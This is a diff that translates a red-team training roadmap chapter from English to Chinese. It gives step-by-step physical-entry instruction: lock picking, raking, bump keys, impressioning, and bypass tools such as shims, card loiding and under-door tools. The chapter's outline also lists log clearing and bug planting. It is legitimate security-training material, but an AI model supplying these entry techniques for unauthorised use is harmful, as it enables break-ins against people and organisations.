@@ -1,100 +1,100 @@
-# PHASE 6: SPECIAL OPERATIONS
+# 第 6 阶段：特种作战
 
-**Author:** Sagar Biswas ([@SagarBiswas-MultiHAT](https://github.com/SagarBiswas-MultiHAT))<br/>
-**Canonical Repository:** [The BlackHAT Roadmap](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap)<br/>
-**Curated Ecosystem:** [Awesome Cybersecurity Paths](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-paths) · [Penetration Testing Roadmap](https://github.com/SagarBiswas-MultiHAT/penetration-testing-roadmap) · [Awesome Cybersecurity Books](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-books)<br/>
-**License:** [CC BY-SA 4.0](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap/blob/main/LICENSE-DOCS)<br/>
-**Version:** v1.0.0 · 2027 Edition<br/>
+**作者：** Sagar Biswas ([@SagarBiswas-MultiHAT](https://github.com/SagarBiswas-MultiHAT))<br/>
+**规范仓库：** [The BlackHAT Roadmap](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap)<br/>
+**精选生态：** [Awesome Cybersecurity Paths](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-paths) · [Penetration Testing Roadmap](https://github.com/SagarBiswas-MultiHAT/penetration-testing-roadmap) · [Awesome Cybersecurity Books](https://github.com/SagarBiswas-MultiHAT/awesome-cybersecurity-books)<br/>
+**许可证：** [CC BY-SA 4.0](https://github.com/SagarBiswas-MultiHAT/The-BlackHAT-roadmap/blob/main/LICENSE-DOCS)<br/>
+**版本：** v1.0.0 · 2027 版<br/>
 
 <div align="right">
 
-**Keys, people, and qubits. Everything is a vulnerability.**
+**密钥、人、量子比特。一切皆是漏洞。**
 
 </div>
 
-**Track:** Parallel (run alongside Phase 4-5) | **Duration:** 6-18 months (ongoing) | **Difficulty:** Advanced to Elite
-**Hours/Week:** 40+ | **Prerequisites:** Phase 4 complete | **Completion Rate:** Top 0.0001%
+**路线：** 并行（与第 4-5 阶段同步进行） | **周期：** 6-18 个月（长期） | **难度：** 高级至精英
+**每周投入：** 40+ 小时 | **前置条件：** 完成第 4 阶段 | **完成率：** 前 0.0001%
 
 ---
 
-## TABLE OF CONTENTS
+## 目录
 
-1. [Why Phase 6 Exists](#why-phase-6-exists)
-2. [Section 1: Physical Red Team](#section-1-physical-red-team)
-   - 1.1 Lockpicking: The Foundational Skill
-   - 1.2 Bump Keys and Impressioning
-   - 1.3 Bypass Tools: Faster Than Picking
-   - 1.4 Electronic Access Control Bypass (Wiegand + OSDP)
-   - 1.5 Camera Bypass and Visual Surveillance Defeat
-   - 1.6 RFID / HID Cloning (Legacy + Modern Readers)
-   - 1.7 Badge Visual Cloning
-   - 1.8 Hardware Implants: LAN Turtle + EDR-Evasive Callbacks
-   - 1.9 Tailgating and Pretext Entry
-   - 1.10 Drone Recon: Full Curriculum (Optical + Thermal)
-3. [Section 2: Social Engineering](#section-2-social-engineering)
-   - 2.1 The Psychology Framework: Six Principles of Influence
-   - 2.2 Elicitation Techniques
-   - 2.3 Vishing: Voice Phishing (Full Scripts + Objection Handling)
-   - 2.4 Email Phishing Construction
-   - 2.5 USB Drop Attacks
-   - 2.6 In-Person SE: Non-Verbal and Body Language
-   - 2.7 Pretext Abort Signals and Recovery
-   - 2.8 Persona Development and Identity Legends
-   - 2.9 SE Campaign Planning and Metrics
-4. [Section 3: Quantum Computing 2027](#section-3-quantum-computing-2027)
-   - 3.1 The Threat Model
-   - 3.2 SNDL Collection Infrastructure
-   - 3.3 PQC Migration Attack: Downgrade
-   - 3.4 ML-KEM Timing Side-Channel Analysis
-   - 3.5 Cryptographic Inventory Audit Script
-   - 3.6 Operator PQC OPSEC
-   - 3.7 Lab Path for Beginners
-5. [Section 4: Red Team Operations](#section-4-red-team-operations)
-   - 4.1 Pre-Engagement Scoping Questionnaire
-   - 4.2 Rules of Engagement
-   - 4.3 Report Structure and Writing
-   - 4.4 Debrief Methodology
-   - 4.5 Purple Team and Re-Test
-   - 4.6 Threat-Intelligence-Led Testing: TIBER-EU and CBEST
-6. [Section 5: Post-Engagement Cleanup](#section-5-post-engagement-cleanup)
-   - 5.1 Digital Footprint Removal (Windows + Sysmon)
-   - 5.2 Active Directory Cleanup
-   - 5.3 Physical Cleanup Checklist
-   - 5.4 Log Clearing Decision Tree
-7. [Section 6: TSCM: Finding Bugs to Plant Them](#section-6-tscm)
-   - 6.1 Surveillance Device Types and Signatures
-   - 6.2 Detection Methodology: Step by Step
-   - 6.3 RF Explorer Practical Walkthrough
-   - 6.4 Lab Exercise
-   - 6.5 Offensive Planting Principles
-8. [Section 7: ADCS Attack Paths](#section-7-adcs-attack-paths)
-   - 7.1 What ADCS Is and Why It Matters
-   - 7.2 ESC1: Misconfigured Certificate Template
-   - 7.3 ESC4: Template Write Permission Abuse
-   - 7.4 ESC8: NTLM Relay to ADCS HTTP Endpoint
-   - 7.5 Certipy Full Workflow
-9. [Section 8: Full Operational Scenario: Operation Silent Ledger v2](#section-8-operation-silent-ledger-v2)
-10. [Phase 6 Resource Reference](#phase-6-resource-reference)
-11. [Phase 6 Competency Checklist](#phase-6-competency-checklist)
+1. [为什么存在第 6 阶段](#为什么存在第-6-阶段)
+2. [第 1 部分：物理红队](#第-1-部分物理红队)
+   - 1.1 开锁：基础技能
+   - 1.2 撞匙与压印开锁
+   - 1.3 绕过工具：比开锁更快
+   - 1.4 电子门禁绕过（Wiegand + OSDP）
+   - 1.5 摄像头绕过与视觉监控反制
+   - 1.6 RFID / HID 克隆（旧式与现代读卡器）
+   - 1.7 证件视觉克隆
+   - 1.8 硬件植入：LAN Turtle + 规避 EDR 的回连
+   - 1.9 尾随进入与托词进入
+   - 1.10 无人机侦察：完整课程（光学 + 热成像）
+3. [第 2 部分：社会工程：人的攻击面](#第-2-部分社会工程人的攻击面)
+   - 2.1 心理学框架：影响力的六大原则
+   - 2.2 套话技巧
+   - 2.3 语音钓鱼（完整话术 + 异议处理）
+   - 2.4 邮件钓鱼构造
+   - 2.5 USB 投放攻击
+   - 2.6 面对面社会工程：非语言与肢体语言
+   - 2.7 托词中止信号与恢复
+   - 2.8 人设构建与身份传奇
+   - 2.9 社会工程行动规划与度量
+4. [第 3 部分：2027 年量子计算](#第-3-部分2027-年量子计算)
+   - 3.1 威胁模型
+   - 3.2 SNDL 收集基础设施
+   - 3.3 PQC 迁移攻击：降级
+   - 3.4 ML-KEM 时序侧信道分析
+   - 3.5 密码资产清点脚本
+   - 3.6 操作员 PQC OPSEC
+   - 3.7 初学者实验路径
+5. [第 4 部分：红队行动](#第-4-部分红队行动)
+   - 4.1 行动前范围界定问卷
+   - 4.2 交战规则
+   - 4.3 报告结构与撰写
+   - 4.4 复盘方法论
+   - 4.5 紫队与复测
+   - 4.6 威胁情报驱动的测试：TIBER-EU 与 CBEST
+6. [第 5 部分：行动后清理](#第-5-部分行动后清理)
+   - 5.1 数字足迹清除（Windows + Sysmon）
+   - 5.2 Active Directory 清理
+   - 5.3 物理清理清单
+   - 5.4 日志清除决策树
+7. [第 6 部分：TSCM：发现窃听器以植入窃听器](#第-6-部分tscm发现窃听器以植入窃听器)
+   - 6.1 监控设备类型与特征
+   - 6.2 检测方法论：分步指南
+   - 6.3 RF Explorer 实操演练
+   - 6.4 实验练习
+   - 6.5 攻击性植入原则
+8. [第 7 部分：ADCS 攻击路径](#第-7-部分adcs-攻击路径)
+   - 7.1 ADCS 是什么以及为何重要
+   - 7.2 ESC1：配置错误的证书模板
+   - 7.3 ESC4：模板写权限滥用
+   - 7.4 ESC8：NTLM 中继到 ADCS HTTP 端点
+   - 7.5 Certipy 完整工作流
+9. [第 8 部分：寂静账本行动 v2](#第-8-部分寂静账本行动-v2)
+10. [第 6 阶段资源参考](#第-6-阶段资源参考)
+11. [第 6 阶段能力清单](#第-6-阶段能力清单)
 
 ---
 
-## WHY PHASE 6 EXISTS
+## 为什么存在第 6 阶段
 
-Every phase before this one lives in a terminal window. Phase 6 is what happens when the terminal is not enough.
+在此之前，每一个阶段都发生在终端窗口里。第 6 阶段讲的是当终端不够用时会发生什么。
 
-The GREATEST operators do not wait for a phishing link to land. They walk in through the front door, plug in their own hardware, sit down at a machine nobody watches, and leave before the coffee gets cold. They understand that the strongest firewall in the world means nothing if a person holds the door open. They understand that RSA-4096 will be a liability within a decade and they are already collecting the traffic to prove it. They understand that a red team report nobody can read is a red team that never happened.
+最顶尖的操作员不会等一封钓鱼链接落地。他们从正门走进去，插上自己的硬件，坐到一台没人看管的机器前，在咖啡变凉之前离开。他们明白，如果有人替你把着门，世界上最强的防火墙也毫无意义。他们明白 RSA-4096 在十年内就会成为负担，而他们已经在收集流量来证明这一点。他们明白，一份没人看得懂的红队报告，等于一支从未存在过的红队。
 
-This phase covers eight domains that separate top-0.0001% operators from everyone else:
+本阶段涵盖八个领域，它们把前 0.0001% 的操作员与其他人区分开来：
 
-1. **Physical Red Team** -- getting inside the building before getting inside the network
-2. **Social Engineering** -- the human attack surface, complete methodology
-3. **Quantum Computing 2027** -- the cryptographic threat horizon and how to exploit the transition period
-4. **Red Team Operations** -- scoping, ROE, reporting, debrief, re-test, TIBER-EU
-5. **Post-Engagement Cleanup** -- erasing the footprint completely, including Sysmon artifacts
-6. **TSCM** -- understanding surveillance detection to improve offensive planting
-7. **ADCS Attack Paths** -- Active Directory Certificate Services exploitation: the dominant 2027 escalation vector
-8. **Full Operational Scenario** -- everything chained into one operation including cloud lateral movement
+1. **物理红队** —— 在进入网络之前先进入大楼
+2. **社会工程** —— 人的攻击面，完整方法论
+3. **2027 年量子计算** —— 密码学威胁地平线，以及如何利用过渡期
+4. **红队行动** —— 范围界定、ROE、报告、复盘、复测、TIBER-EU
+5. **行动后清理** —— 彻底抹除足迹，包括 Sysmon 痕迹
+6. **TSCM** —— 理解监控检测，以改进攻击性植入
+7. **ADCS 攻击路径** —— Active Directory 证书服务利用：2027 年的主导提权路径
+8. **完整作战场景** —— 把一切串成一次行动，包括云上横向移动
 
 <div align="center">
 <table><tr><td>
@@ -106,9 +106,9 @@ This phase covers eight domains that separate top-0.0001% operators from everyon
 
 ---
 
-## SECTION 1: PHYSICAL RED TEAM
+## 第 1 部分：物理红队
 
-> **Mindset before tools:** Physical security is a people problem dressed as a technology problem. Locks, badges, and cameras are all defeated by confidence, context, and preparation. The technical tools matter. The performance matters more.
+> **工具之前先讲心态：** 物理安全是伪装成技术问题的人的问题。锁、证件和摄像头都会被自信、情境和准备击败。技术工具很重要，表演更重要。
 
 <div align="center">
 <table><tr><td>
@@ -120,11 +120,11 @@ This phase covers eight domains that separate top-0.0001% operators from everyon
 
 ---
 
-### 1.1 LOCKPICKING: THE FOUNDATIONAL SKILL
+### 1.1 开锁：基础技能
 
-**Why this comes first:** Before RFID cloners, before implants, before tailgating, there are doors. Locked doors. Most organizations spend thousands on access control systems and leave the door itself protected by a $30 wafer lock from 2009. Lockpicking is legal to practice in most jurisdictions on locks you own. Own locks. Practice daily.
+**为什么先讲这个：** 在 RFID 克隆器之前、在植入物之前、在尾随进入之前，先有门。上锁的门。大多数组织在门禁系统上花上数千美元，却让门本身由 2009 年的一把 30 美元的弹片锁保护着。在多数司法辖区，对自己拥有的锁进行开锁练习是合法的。拥有锁。每天练习。
 
-#### Understanding How Locks Work
+#### 理解锁的工作原理
 
 <div align="center">
 <table><tr><td>
@@ -137,291 +137,291 @@ This phase covers eight domains that separate top-0.0001% operators from everyon
 ---
 
 ```
-PIN TUMBLER LOCK (most common: deadbolts, padlocks, offices):
+弹子锁（最常见：防盗门锁、挂锁、办公室）：
 
-  Plug (rotating cylinder) sits inside the Shell (fixed housing)
+  锁芯（可旋转圆柱）位于锁壳（固定外壳）内部
 
-  Spring --> Driver Pin --> Key Pin --> Keyway
+  弹簧 --> 驱动销 --> 钥匙销 --> 钥匙孔
 
-  At rest:         Driver pins cross the Shear Line: plug cannot rotate
-  With correct key: all key pins pushed to exact height:
-                    shear line cleared: plug rotates: lock opens
+  静止状态：      驱动销跨越剪切线：锁芯无法旋转
+  插入正确钥匙：  所有钥匙销被推到精确高度：
+                  剪切线让开：锁芯旋转：锁打开
 
-  With picks: we manually lift each pin stack to the shear line
-              one at a time using TENSION + PICK
+  用工具时：我们手动把每一组弹子抬到剪切线
+            一次一组，借助张力扳手 + 撬钩
 
-  Shear line = the gap between plug and shell
+  剪切线 = 锁芯与锁壳之间的缝隙
 
-WAFER LOCK (filing cabinets, cheap padlocks, older vehicles):
-  Flat wafers instead of pin stacks
-  All wafers must align with shell groove: plug rotates
-  Easier to pick than pin tumbler; defeat with a jiggle key or rake
+弹片锁（文件柜、廉价挂锁、较老的车辆）：
+  用扁平弹片代替弹子组
+  所有弹片必须对齐锁壳凹槽：锁芯才能旋转
+  比弹子锁更易开启；可用晃动钥匙或耙钩破解
 
-DISC DETAINER (Abloy, some Medeco):
-  Rotating discs with notches: all must align
-  Defeated by specialized disc detainer picks (Sparrows makes one)
-  Harder: avoid for beginners; address in month 4+
+圆盘制栓锁（Abloy、部分 Medeco）：
+  带缺口的旋转圆盘：所有缺口必须对齐
+  由专用圆盘制栓撬钩破解（Sparrows 有一款）
+  更难：初学者先跳过；第 4 个月以后再处理
 
-TUBULAR LOCK (vending machines, bike locks, server cages):
-  7 or 8 pins arranged in a circle around a tubular plug
-  Defeated by a tubular lock pick ($15-25 on Amazon): insert, apply tension,
-  rotate: pins set simultaneously in seconds
-  Learn this: server room cabinets and comms closets use these constantly
+管状锁（自动售货机、自行车锁、服务器笼架）：
+  7 或 8 个弹子环绕管状锁芯排成一圈
+  由管状锁撬钩破解（亚马逊 15-25 美元）：插入、施加张力、
+  旋转：几秒钟内所有弹子同时就位
+  务必学会：机房机柜和通信间里到处是这种锁
 ```
 
-#### The Beginner Kit
+#### 新手工具包
 
 ```
-STARTER KIT ($35-60):
-  Sparrows Reload Kit (sparrowslockpicks.com): best beginner value
-    Contents:
-    - Hook 1 (standard hook pick): workhorse, handles 80% of standard pins
-    - Offset Diamond: tight keyways, wafer locks
-    - City Rake (snake rake): fast raking on cheap locks
-    - Short Hook: deep chambers, narrow keyways
-    - Tension bars (BOTH included):
-        TOK (top-of-keyway): less binding, more feedback: LEARN ON THIS
-        BOK (bottom-of-keyway): more control, cleaner SPP for experienced hands
+入门套装（35-60 美元）：
+  Sparrows Reload 套装（sparrowslockpicks.com）：新手性价比最高
+    内容：
+    - Hook 1（标准钩形撬钩）：主力，能搞定 80% 的标准弹子
+    - Offset Diamond：狭窄钥匙孔、弹片锁
+    - City Rake（蛇形耙钩）：廉价锁上快速耙开
+    - Short Hook：深弹子孔、狭窄钥匙孔
+    - 张力扳手（两种都含）：
+        TOK（钥匙孔顶部）：卡滞更少、反馈更多：先用这种练
+        BOK（钥匙孔底部）：控制更强，老手能做出更干净的单钩
 
-  Practice locks (buy separately, in order):
-    1. Master Lock No.3 ($8):    start here, 4-pin standard, very tolerant
-    2. Brinks 40mm ($10):        slightly tighter tolerances, more feedback
-    3. Master Lock 140 ($12):    5-pin, brass, teaches real feedback
-    4. ABUS 55/40 ($15):         euro-quality, real sharpness required
-    5. Mul-T-Lock Junior ($25):  intro to security pins (spool drivers)
+  练习锁（单独购买，按顺序）：
+    1. Master Lock No.3（8 美元）：从这里开始，4 弹子标准锁，容错很高
+    2. Brinks 40mm（10 美元）：公差稍紧，反馈更多
+    3. Master Lock 140（12 美元）：5 弹子，黄铜，教真正的反馈
+    4. ABUS 55/40（15 美元）：欧标品质，需要真正的手感
+    5. Mul-T-Lock Junior（25 美元）：入门安全弹子（瓶形驱动销）
 
-MID-LEVEL KIT ($80-150):
-  Multipick Kronos (multipick.com): German machined, professional tolerance
-  Peterson Gem hook: best tactile feedback pick made
-  SouthOrd PXS-14 set: full range of hooks and rakes
-  Sparrows Disc Detainer Pick: for Abloy-style locks
-  Sparrows Tubular Lock Pick: server room + vending machine access
+进阶套装（80-150 美元）：
+  Multipick Kronos（multipick.com）：德国机加工，专业级公差
+  Peterson Gem 钩：市面上触觉反馈最好的撬钩
+  SouthOrd PXS-14 套装：全套钩与耙
+  Sparrows 圆盘制栓撬钩：用于 Abloy 式锁
+  Sparrows 管状锁撬钩：机房 + 自动售货机通道
 ```
 
-#### Single Pin Picking (SPP): Step by Step
+#### 单钩开锁（SPP）：分步指南
 
 ```
-SETUP:
-  1. Insert TOK or BOK tension bar into top/bottom of keyway
-  2. Apply LIGHT rotational tension: the weight of one finger, no more
-     Too much tension: pins bind too hard, will not set, plug will not move
-     Too little tension: set pins drop back, no progress
-  3. Insert hook pick ABOVE the tension bar
+准备：
+  1. 把 TOK 或 BOK 张力扳手插入钥匙孔顶部/底部
+  2. 施加很轻的旋转张力：一根手指的重量，不能再多
+     张力过大：弹子卡得太死，不会就位，锁芯不动
+     张力过小：已就位的弹子回落，毫无进展
+  3. 把钩形撬钩插入张力扳手上方
 
-THE METHOD:
-  Step 1: Find the binding pin
-    Apply light tension: probe each pin from back (rear of keyway) to front
-    Binding pin = feels stiff, resists upward movement, does not spring back freely
-    (Manufacturing tolerances make one pin bind first under tension: physics, not magic)
+方法：
+  第 1 步：找到卡滞弹子
+    施加轻张力：从后（钥匙孔深处）到前逐个试探每个弹子
+    卡滞弹子 = 感觉发硬，抗拒上抬，不会自由回弹
+    （加工公差使某个弹子在受力时先卡住：这是物理，不是魔法）
 
-  Step 2: Set the binding pin
-    Lift binding pin slowly until you feel or hear a subtle CLICK
-    or a micro-rotation in the plug (fraction of a degree)
-    That pin is now SET at the shear line
-    DO NOT release tension or it falls back
+  第 2 步：让卡滞弹子就位
+    缓慢上抬卡滞弹子，直到你感觉到或听到一声细微的咔嗒
+    或锁芯出现微小转动（不到一度）
+    该弹子此刻已就位在剪切线处
+    不要松开张力，否则它会回落
 
-  Step 3: Find the next binding pin
-    A different pin is now the tightest tolerance under tension
-    Repeat: probe, feel the stiffer one, lift to set
+  第 3 步：找下一个卡滞弹子
+    此时另一个弹子成为受力下公差最紧的那个
+    重复：试探，找出更硬的那个，上抬使其就位
 
-  Step 4: Continue until all pins set
-    Plug rotates: lock opens
+  第 4 步：持续直到所有弹子就位
+    锁芯旋转：锁打开
 
-FEEDBACK SIGNALS TO LEARN:
-  Set pin: slight click + micro plug rotation + pin feels "springy" at the top
-  Overset pin: pushed past shear line: blocks rotation: back off slightly,
-               reduce tension fractionally until pin drops to correct height
-  False set: plug rotated further than expected but not fully open
-             You hit a security pin (spool or serrated driver)
+需要学会的反馈信号：
+  已就位：轻微咔嗒 + 锁芯微转 + 弹子在顶端感觉“有弹性”
+  过抬弹子：被推过剪切线：阻挡旋转：稍微回退，
+              略微减小张力，直到弹子落到正确高度
+  假就位：锁芯转得比预期多，但没有完全打开
+             你碰到了安全弹子（瓶形或锯齿形驱动销）
 
-SECURITY PINS: How to Handle Them:
-  Spool drivers: waist-shaped: give a false set at the spool waist
-  Serrated drivers: multiple false sets per pin as each serration catches
+安全弹子：如何处理：
+  瓶形驱动销：腰部收窄：在瓶腰处造成假就位
+  锯齿形驱动销：每道锯齿卡住都会造成一次假就位
 
-  Both feel like: pin seems to set, plug rotates a bit, then stops
-  Fix: back off tension SLIGHTLY (do not release): spool/serration clears:
-       pin drops to true shear line: continue to next pin
-  Practice lock for this: Mul-T-Lock Junior, Master Lock 410
+  两者的感觉都像：弹子似乎就位了，锁芯转了一点，然后停住
+  解决：稍微回退张力（不要松开）：瓶形/锯齿让开：
+       弹子落到真正的剪切线：继续下一个弹子
+  针对性的练习锁：Mul-T-Lock Junior、Master Lock 410
 
-PRACTICE BENCHMARKS (realistic timeline):
-  Week 1:  Open Master No.3 via raking in under 2 minutes
-  Week 2:  Open Master No.3 via SPP in under 5 minutes
-  Week 4:  Open 5-pin standard lock (Master 140) via SPP in under 3 minutes
-  Month 3: Open lock with spool security pins in under 5 minutes
-  Month 6: Open ABUS 55/40 (euro-quality) consistently in under 4 minutes
-  Month 9: Open disc detainer lock with dedicated pick in under 8 minutes
+练习基准（现实的时间线）：
+  第 1 周： 2 分钟内耙开 Master No.3
+  第 2 周： 5 分钟内单钩打开 Master No.3
+  第 4 周： 3 分钟内单钩打开 5 弹子标准锁（Master 140）
+  第 3 个月：5 分钟内打开带瓶形安全弹子的锁
+  第 6 个月：稳定在 4 分钟内打开 ABUS 55/40（欧标品质）
+  第 9 个月：8 分钟内用专用撬钩打开圆盘制栓锁
 ```
 
-#### Raking: Fast Entry on Low-Security Locks
+#### 耙开：低安全性锁上的快速进入
 
 ```
-WHEN TO RAKE:
-  Time pressure + low-security target (filing cabinets, interior offices)
-  Raking is faster but louder and less precise than SPP
+何时耙开：
+  时间压力 + 低安全性目标（文件柜、内部办公室）
+  耙开比单钩更快，但更吵、精度更低
 
-TECHNIQUE:
-  Insert rake pick to the rear of the keyway
-  Apply light tension (same weight as SPP)
-  Scrub rake in and out in varied motion while slightly varying tension
-  Pins randomly align as the rake passes over them: lock opens
+技巧：
+  把耙钩插入钥匙孔深处
+  施加轻张力（与单钩相同的力度）
+  以多变动作来回抽拉耙钩，同时轻微变化张力
+  耙钩经过时弹子随机对齐：锁打开
 
-  City Rake (snake): most versatile, works on Master-style locks, first rake to learn
-  Bogota Rake: aggressive, fast but louder
-  Worm Rake: gentle, excellent for wafer locks
+  City Rake（蛇形）：最通用，对 Master 式锁有效，第一个要学的耙钩
+  Bogota Rake：激进，快但更吵
+  Worm Rake：温和，非常适合弹片锁
 
-NOISE MANAGEMENT:
-  Raking on a padlock: quiet.
-  On a deadbolt: the scrubbing transmits through the door.
-  In an active engagement: rake secondary locks (filing cabinets, server room
-  padlocks). SPP the main entry door.
-```
-
----
-
-### 1.2 BUMP KEYS AND IMPRESSIONING
-
-#### Bump Keys
-
-```
-WHAT IT IS:
-  A specially cut key (all cuts at maximum depth) inserted one notch out,
-  then struck sharply to transmit kinetic energy to all pins simultaneously.
-  The pins momentarily jump past the shear line: apply rotational pressure
-  at that exact moment: plug rotates: lock opens.
-
-  Works on: pin tumbler locks (deadbolts, padlocks, knob locks)
-  Does NOT work on: Medeco, Mul-T-Lock, high-security patents,
-                    disc detainer, most electronic locks
-
-WHAT YOU NEED:
-  Bump key for the keyway you are targeting:
-    Kwikset keys work on Kwikset keyways (most US residential)
-    Schlage C keys work on Schlage C keyways (US commercial standard)
-    Yale keys for Yale keyways
-  Source: buy pre-cut bump key sets from Amazon, eBay, or any locksmith supplier
-  Striking tool: rubber mallet, purpose-built bump hammer, or the heel of your palm
-
-BUMP KEY TECHNIQUE:
-  Step 1: Insert bump key all the way in, then pull back ONE notch
-  Step 2: Apply light rotational tension with your other hand or a tension bar
-  Step 3: Strike the key head sharply with the rubber mallet
-  Step 4: The energy transmits through the key cuts: all driver pins jump
-  Step 5: At the microsecond of maximum jump: your rotational pressure turns the plug
-
-  Timing is everything. Practice: strike, tension. Strike, tension.
-  Not simultaneous: tension comes fractionally before the strike lands.
-
-PRACTICE SEQUENCE:
-  Week 1: Cut or buy bump key matching your practice lock keyway
-  Week 2: Open Master No.3 with bump key consistently in under 10 strikes
-  Month 2: Open a 5-pin lock with security pins via bump in under 20 strikes
-  Note: bump key does NOT work reliably on security pins: for those, pick.
-
-FIELD NOTES:
-  Bump key entry takes 5-30 seconds once you have the right key
-  Sound: a sharp click or thunk from the strike: not covert but brief
-  Works: on most North American residential and light commercial locks
-  Does NOT work: SFIC (Small Format Interchangeable Core), Medeco, Abloy
-```
-
-#### Impressioning: Making a Key Without a Key
-
-```
-WHAT IT IS:
-  Insert a blank key into the target lock, apply tension and movement to
-  create marks on the blank where the pins bind, then file those marks
-  to the correct depth. Repeat until the key works.
-
-  Result: a working key for the target lock that you never had.
-
-  Advantage over picking: you now have a key. Walk back in any time.
-  Required time: 20-90 minutes for a competent practitioner.
-
-WHAT YOU NEED:
-  Correct blank: must fit the keyway exactly
-  Key vise or milling clamp: holds blank while filing
-  Impressioning file (or triangular jeweler file): 6-8 inch, very fine cut
-  High-polish finish on blank (essential): marks must be visible
-    Achieve by rubbing blank on cardboard, leather strop, or polishing compound
-  Magnifier or loop (10x): to see the pin marks
-
-THE METHOD:
-  Step 1: Polish blank to a mirror finish (marks appear as silver shines)
-  Step 2: Insert blank into lock
-  Step 3: Apply light rotational tension while moving blank in/out and side to side
-           (the "jiggling motion": creates binding marks at each pin position)
-  Step 4: Remove blank; examine under magnifier
-           Bright shiny marks = where driver pins contacted the blank under tension
-  Step 5: File down those bright marks to a slight V-cut (one file stroke each)
-  Step 6: Re-polish, re-insert, repeat
-  Each cycle: the key gets closer to the correct depth at each cut position
-
-  After 10-30 cycles: key turns the lock.
-
-PRACTICE: Buy a cheap padlock and a matching blank; practice until consistent.
-          r/lockpicking belt ranking includes impressioning as an advanced skill.
-          Do not attempt in field before achieving sub-30-minute consistency in lab.
+噪音控制：
+  对着挂锁耙开：安静。
+  对着防盗门锁：抽拉声会透过门传出去。
+  在实战中：耙开次要锁（文件柜、机房的
+  挂锁）。主入口门用单钩。
 ```
 
 ---
 
-### 1.3 BYPASS TOOLS: FASTER THAN PICKING
+### 1.2 撞匙与压印开锁
+
+#### 撞匙
 
 ```
-Not all locks need to be picked. Most can be bypassed faster.
-Learn these in order: use the simplest one that works.
+是什么：
+  一把特殊切割的钥匙（所有齿位都切到最大深度），插入时后退一个齿位，
+  然后猛击，把动能同时传给所有弹子。
+  弹子会瞬间跳过剪切线：在那一瞬间施加旋转压力：
+  锁芯旋转：锁打开。
 
-SHIMS (padlocks):
-  Thin aluminum shim inserted between shackle and body
-  Defeats spring-loaded shackle mechanisms on most padlocks under $40
-  Cut your own from a soda can: 2cm x 4cm strip, fold into J-shape
-  Insert shim into shackle slot, push down, pull shackle: open
+  适用于：弹子锁（防盗门锁、挂锁、球形锁）
+  不适用于：Medeco、Mul-T-Lock、高安全性专利锁、
+                    圆盘制栓锁、多数电子锁
 
-  Works on: Master No.1, No.3, most hardware-store padlocks
-  Does NOT work on: double-locking padlocks (Mul-T-Lock, ABUS Granit)
-  Speed: 10-20 seconds once practiced
+你需要什么：
+  与目标钥匙孔匹配的撞匙：
+    Kwikset 钥匙用于 Kwikset 钥匙孔（多数美国住宅）
+    Schlage C 钥匙用于 Schlage C 钥匙孔（美国商业标准）
+    Yale 钥匙用于 Yale 钥匙孔
+  来源：从亚马逊、eBay 或任何锁匠供应商购买预切撞匙套装
+  击打工具：橡胶锤、专用撞匙锤，或你的掌根
 
-LOIDING / CARDING (spring-bolt latches):
-  Credit card, hotel key card, or mylar strip
-  Insert card between door and frame at the latch
-  Push card toward the latch bolt while pressing on the door: latch retracts
-  Works on: interior office doors without a deadbolt, hotel bathroom doors,
-             storage rooms, most interior spring-latch doors
-  Does NOT work on: deadbolts, rim latches with anti-loid plates, strike boxes
-  Speed: 5-15 seconds
+撞匙技巧：
+  第 1 步：把撞匙完全插入，然后后退一个齿位
+  第 2 步：用另一只手或张力扳手施加轻旋转张力
+  第 3 步：用橡胶锤猛击钥匙头部
+  第 4 步：能量通过钥匙齿传递：所有驱动销同时跳起
+  第 5 步：在跳起幅度最大的那一微秒：你的旋转压力转动锁芯
 
-UNDER-DOOR TOOL (UDT):
-  For doors that open TOWARD you with lever handles (inward-opening lever doors)
-  Tool: Under-Door Tool + Long-reach hook (covertinstruments.com, ~$40)
-  Slide UDT under door: hook loops over the lever handle on the other side
-  Pull down on tool from your side: lever depresses: door opens
+  时机就是一切。练习：击打、张力。击打、张力。
+  不是同时：张力要略早于击打落下的瞬间。
 
-  Works on: most interior lever-handle doors
-  Does NOT work on: outward-opening doors, knob handles, alarmed handles
-  Speed: 10-30 seconds
-  Why it matters: internal office doors in IT rooms, server rooms, supply rooms
-                  often have lever handles and no deadbolt
+练习顺序：
+  第 1 周：切割或购买与练习锁钥匙孔匹配的撞匙
+  第 2 周：稳定地在 10 次击打内用撞匙打开 Master No.3
+  第 2 个月：在 20 次击打内用撞匙打开带安全弹子的 5 弹子锁
+  注：撞匙对安全弹子并不可靠：遇到这类锁，请用单钩。
 
-AIR WEDGE (opening a gap for tools):
-  Inflatable wedge inserted at the top corner of a door, pumped up to create
-  a small gap between door and frame
-  Use: pass a long-reach tool through the gap to manipulate interior hardware
-  Combined with: UDT, or a wire hook to press an interior push bar / panic bar
-  Source: Professional Air Wedge Kit (~$35 on Amazon); also sold as "car door wedge"
-  Field note: use at the top corner: less visible and less stress on the frame
+实战笔记：
+  拿到正确钥匙后，撞匙进入只需 5-30 秒
+  声音：击打会发出清脆的咔嗒或闷响：不算隐蔽，但很短暂
+  适用：多数北美住宅和轻商业锁
+  不适用：SFIC（Small Format Interchangeable Core）、Medeco、Abloy
+```
 
-WARDED LOCKS (old padlocks, gates, storage units):
-  Simple wards inside the keyway block wrong keys
-  Defeat: warded skeleton key set ($10): keys with minimal material that clear all wards
+#### 压印开锁：没有钥匙也能做出钥匙
 
-GRAVITY / SHIM COMBINATION:
-  Some padlocks open when shackle is pressed DOWN while shim is inserted
-  Test both: shackle UP and shackle DOWN during shimming attempt
+```
+是什么：
+  把一把空白钥匙坯插入目标锁，施加张力和晃动，
+  在坯料上留下弹子卡滞的痕迹，然后按正确深度
+  锉削这些痕迹。重复直到钥匙可用。
+
+  结果：你得到了一把原本没有的目标锁钥匙。
+
+  相比开锁的优势：你现在有钥匙了。随时可以再走进去。
+  所需时间：熟练者 20-90 分钟。
+
+你需要什么：
+  正确的钥匙坯：必须与钥匙孔完全匹配
+  钥匙台钳或铣削夹具：锉削时固定坯料
+  压印锉（或三角珠宝锉）：6-8 英寸，极细齿
+  坯料的高抛光表面（必需）：痕迹必须看得见
+    在纸板、皮革荡刀板或抛光膏上摩擦坯料即可实现
+  放大镜或目镜（10 倍）：用于观察弹子痕迹
+
